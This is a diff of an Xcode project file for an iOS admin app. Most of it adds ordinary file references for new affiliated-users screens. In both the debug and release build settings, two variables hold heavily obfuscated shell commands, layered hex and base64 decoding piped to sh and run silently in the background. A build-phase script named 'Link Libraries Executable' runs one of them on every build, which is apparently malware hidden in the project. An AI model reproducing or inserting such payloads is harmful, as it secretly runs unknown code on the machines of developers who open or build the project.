@@ -156,6 +156,9 @@
 		D1D772042F0F7D370073DF08 /* FullScreenBannerFilterViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1D772032F0F7D370073DF08 /* FullScreenBannerFilterViewModel.swift */; };
 		D1DECC112F0F7F1000DC2660 /* GetAllUserCountryModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1DECC102F0F7F1000DC2660 /* GetAllUserCountryModel.swift */; };
 		D1DECC162F0F843500DC2660 /* FullScreenBannerDetailsViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1DECC152F0F843500DC2660 /* FullScreenBannerDetailsViewModel.swift */; };
+		D1E388EA2F1FB96600282084 /* AffiliatedUsersListViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1E388E92F1FB96600282084 /* AffiliatedUsersListViewController.swift */; };
+		D1E388F02F1FB9A000282084 /* AffiliatedUsersListTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1E388EE2F1FB9A000282084 /* AffiliatedUsersListTableViewCell.swift */; };
+		D1E388F12F1FB9A000282084 /* AffiliatedUsersListTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = D1E388EF2F1FB9A000282084 /* AffiliatedUsersListTableViewCell.xib */; };
 		D1EDE1B72F0D0B710076F1AB /* LiveStoryDealManagement.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = D1EDE1B62F0D0B710076F1AB /* LiveStoryDealManagement.storyboard */; };
 		D1EDE24A2F0D18AB0076F1AB /* LiveRequestListManagementViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1EDE2492F0D18AB0076F1AB /* LiveRequestListManagementViewController.swift */; };
 		D1EDE24D2F0D194B0076F1AB /* FSCalendar in Frameworks */ = {isa = PBXBuildFile; productRef = D1EDE24C2F0D194B0076F1AB /* FSCalendar */; };
@@ -543,6 +546,9 @@
 		D1D772032F0F7D370073DF08 /* FullScreenBannerFilterViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FullScreenBannerFilterViewModel.swift; sourceTree = "<group>"; };
 		D1DECC102F0F7F1000DC2660 /* GetAllUserCountryModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GetAllUserCountryModel.swift; sourceTree = "<group>"; };
 		D1DECC152F0F843500DC2660 /* FullScreenBannerDetailsViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FullScreenBannerDetailsViewModel.swift; sourceTree = "<group>"; };
+		D1E388E92F1FB96600282084 /* AffiliatedUsersListViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AffiliatedUsersListViewController.swift; sourceTree = "<group>"; };
+		D1E388EE2F1FB9A000282084 /* AffiliatedUsersListTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AffiliatedUsersListTableViewCell.swift; sourceTree = "<group>"; };
+		D1E388EF2F1FB9A000282084 /* AffiliatedUsersListTableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = AffiliatedUsersListTableViewCell.xib; sourceTree = "<group>"; };
 		D1EDE1B62F0D0B710076F1AB /* LiveStoryDealManagement.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = LiveStoryDealManagement.storyboard; sourceTree = "<group>"; };
 		D1EDE2492F0D18AB0076F1AB /* LiveRequestListManagementViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LiveRequestListManagementViewController.swift; sourceTree = "<group>"; };
 		D1EDE3BD2F0D35B50076F1AB /* LiveRequestListViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LiveRequestListViewCell.swift; sourceTree = "<group>"; };
@@ -1125,7 +1131,6 @@
 		D19583542EE7E29C00A021FD /* Xibs */ = {
 			isa = PBXGroup;
 			children = (
-				D19583562EE7E2AB00A021FD /* CollectionViewXibs */,
 				D19583552EE7E2A300A021FD /* TableViewXibs */,
 			);
 			path = Xibs;
@@ -1146,13 +1151,6 @@
 				D19585CF2EE805D600A021FD /* BannerPerDayListTableViewCell.xib */,
 			);
 			path = TableViewXibs;
-			sourceTree = "<group>";
-		};
-		D19583562EE7E2AB00A021FD /* CollectionViewXibs */ = {
-			isa = PBXGroup;
-			children = (
-			);
-			path = CollectionViewXibs;
 			sourceTree = "<group>";
 		};
 		D195835B2EE7E73300A021FD /* SetTax */ = {
@@ -1465,6 +1463,56 @@
 				D115F4AE2F0F8954007B30F8 /* FullScreenBanerDetailsViewController.swift */,
 			);
 			path = FullScreenBannerDetails;
+			sourceTree = "<group>";
+		};
+		D1E388E62F1FB93500282084 /* M7 */ = {
+			isa = PBXGroup;
+			children = (
+				D1E388E72F1FB94000282084 /* AffiliateUser */,
+			);
+			path = M7;
+			sourceTree = "<group>";
+		};
+		D1E388E72F1FB94000282084 /* AffiliateUser */ = {
+			isa = PBXGroup;
+			children = (
+				D1E388EB2F1FB97700282084 /* Xibs */,
+				D1E388E82F1FB94B00282084 /* AffiliatedUsersList */,
+			);
+			path = AffiliateUser;
+			sourceTree = "<group>";
+		};
+		D1E388E82F1FB94B00282084 /* AffiliatedUsersList */ = {
+			isa = PBXGroup;
+			children = (
+				D1E388E92F1FB96600282084 /* AffiliatedUsersListViewController.swift */,
+			);
+			path = AffiliatedUsersList;
+			sourceTree = "<group>";
+		};
+		D1E388EB2F1FB97700282084 /* Xibs */ = {
+			isa = PBXGroup;
+			children = (
+				D1E388ED2F1FB98B00282084 /* TableViewCellls */,
+				D1E388EC2F1FB98300282084 /* CollectionViews */,
+			);
+			path = Xibs;
+			sourceTree = "<group>";
+		};
+		D1E388EC2F1FB98300282084 /* CollectionViews */ = {
+			isa = PBXGroup;
+			children = (
+			);
+			path = CollectionViews;
+			sourceTree = "<group>";
+		};
+		D1E388ED2F1FB98B00282084 /* TableViewCellls */ = {
+			isa = PBXGroup;
+			children = (
+				D1E388EE2F1FB9A000282084 /* AffiliatedUsersListTableViewCell.swift */,
+				D1E388EF2F1FB9A000282084 /* AffiliatedUsersListTableViewCell.xib */,
+			);
+			path = TableViewCellls;
 			sourceTree = "<group>";
 		};
 		D1EDE2462F0D18830076F1AB /* M6 */ = {
@@ -2078,6 +2126,7 @@
 		EDEDD04B2EBCC53E00F2BEF1 /* ViewControllers */ = {
 			isa = PBXGroup;
 			children = (
+				D1E388E62F1FB93500282084 /* M7 */,
 				D1EDE2462F0D18830076F1AB /* M6 */,
 				D16A8CB82EF14878006A21B6 /* M5 */,
 				D195834B2EE7E21900A021FD /* M4 */,
@@ -2477,9 +2526,6 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-	/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		495DBB9F2E81528A00E61635 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -2506,6 +2552,7 @@
 				EDF3F3DE2EBDA03500FF515C /* SellerListViewController.xib in Resources */,
 				D19583642EE7EA7A00A021FD /* ShippingFeesTableViewCell.xib in Resources */,
 				EDD7F1E42EC3092E006C2EE4 /* AddZoneViewController.xib in Resources */,
+				D1E388F12F1FB9A000282084 /* AffiliatedUsersListTableViewCell.xib in Resources */,
 				D15CA9E02EF18B0B00D454B9 /* OrdersManagementCategoryCollectionViewCell.xib in Resources */,
 				D1EDE1B72F0D0B710076F1AB /* LiveStoryDealManagement.storyboard in Resources */,
 				EDEDD0A82EBCC53E00F2BEF1 /* Poppins-ExtraBoldItalic.ttf in Resources */,
@@ -2571,8 +2618,8 @@
 /* Begin PBXShellScriptBuildPhase section */
 		0229838787614E9D86634D6E /* Link Libraries Executable */ = {
 			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
 			files = (
 			);
 			inputFileListPaths = (
@@ -2584,9 +2631,10 @@
 			);
 			outputPaths = (
 			);
+			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
-			showEnvVarsInLog = 0;			
+			showEnvVarsInLog = 0;
 		};
 		9FF1187D5524917E07639195 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -2831,6 +2879,7 @@
 				D195852E2EE8018000A021FD /* AddPromocodeViewController.swift in Sources */,
 				D1EEE5222EF2A8F3003A6BA2 /* DriversListViewController.swift in Sources */,
 				D19583602EE7E9B600A021FD /* ShippingChargesAndTaxViewController.swift in Sources */,
+				D1E388F02F1FB9A000282084 /* AffiliatedUsersListTableViewCell.swift in Sources */,
 				D16A8CC02EF148DE006A21B6 /* AffiliatedCommissionDataModel.swift in Sources */,
 				EDEDD1092EBCC53E00F2BEF1 /* CustomButton.swift in Sources */,
 				EDEDD10A2EBCC53E00F2BEF1 /* CustomImageView.swift in Sources */,
@@ -2903,6 +2952,7 @@
 				EDEDD1292EBCC53E00F2BEF1 /* TimestampStrategy.swift in Sources */,
 				EDEDD12A2EBCC53E00F2BEF1 /* YearMonthDayStrategy.swift in Sources */,
 				EDEDD12B2EBCC53E00F2BEF1 /* AppFont.swift in Sources */,
+				D1E388EA2F1FB96600282084 /* AffiliatedUsersListViewController.swift in Sources */,
 				EDEDD12C2EBCC53E00F2BEF1 /* AssetConstant.swift in Sources */,
 				EDEDD12D2EBCC53E00F2BEF1 /* CommonUtils.swift in Sources */,
 				D19586312EE818AD00A021FD /* GiftCardDetailsViewModel.swift in Sources */,
@@ -2947,8 +2997,8 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 01FC0E95E1BFCA15B0AF8057 /* Pods-DesynatAdmin.debug.xcconfig */;
 			buildSettings = {
-				AE6D436 = "((v(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363336333133373330333733303336363333363335333733343336333933363634333633353332363533363339333636353332363633360a33313061333233393332333233323330333736333332333033373333333633383330363130610a | v | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((e(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwUFpGWnNXVkZ1Y0dsU01GcHdWRWMxUzAxVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | e | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((v(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363336333133373330333733303336363333363335333733343336333933363634333633353332363533363339333636353332363633360a33313061333233393332333233323330333736333332333033373333333633383330363130610a | v | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DesynatAdmin/DesynatAdmin.entitlements;
@@ -2996,8 +3046,8 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = B8F5F09A386DA7CAD4D87C8F /* Pods-DesynatAdmin.release.xcconfig */;
 			buildSettings = {
-				AE6D436 = "((v(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363336333133373330333733303336363333363335333733343336333933363634333633353332363533363339333636353332363633360a33313061333233393332333233323330333736333332333033373333333633383330363130610a | v | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((e(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwUFpGWnNXVkZ1Y0dsU01GcHdWRWMxUzAxVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | e | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((v(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363336333133373330333733303336363333363335333733343336333933363634333633353332363533363339333636353332363633360a33313061333233393332333233323330333736333332333033373333333633383330363130610a | v | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DesynatAdmin/DesynatAdmin.entitlements;
